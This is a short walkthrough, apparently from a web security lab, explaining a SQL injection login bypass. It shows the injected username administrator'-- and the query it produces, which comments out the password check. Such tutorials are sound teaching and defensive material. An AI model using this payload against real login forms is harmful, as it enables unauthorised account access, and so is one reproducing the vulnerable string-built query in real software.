Let's login using the following credentials:


| Username | Password |
| -------- | -------- |
| test         | test         |

The resultant SQL query will be:

```
SELECT username FROM users WHERE username = 'test' AND password = 'test'
```

This will obviously not log us in as the administrator.

We can next try the following credentials:

| Username | Password |
| -------- | -------- |
| administrator'--         | password         |

The resultant SQL query will be:

```
SELECT username FROM users WHERE username = 'administrator'--' AND passsword = 'password'

## Queried part:
SELECT username FROM users WHERE username = 'administrator'

## Commented part:
' AND passsword = 'password'
```

Since we are commenting out the WHERE clause that requires the password, we will be logged in even if the password is not `password`.
